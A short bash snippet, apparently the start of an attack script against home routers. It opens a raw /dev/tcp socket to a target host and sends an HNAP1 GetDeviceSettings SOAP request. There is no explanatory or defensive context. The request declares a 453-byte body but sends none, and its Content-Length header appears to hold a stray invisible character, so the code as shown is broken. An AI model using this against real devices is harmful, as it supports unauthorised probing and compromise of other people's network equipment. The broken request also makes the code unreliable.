exec 3<>/dev/tcp/$1/80
echo -e 'POST /HNAP1/ HTTP/1.1\r\nHost: '$1:$2'\r\nSOAPAction: "http://purenetworks.com/HNAP1/GetDeviceSettings"\r\nContent­Length: 453\r\n\r\n' >&3
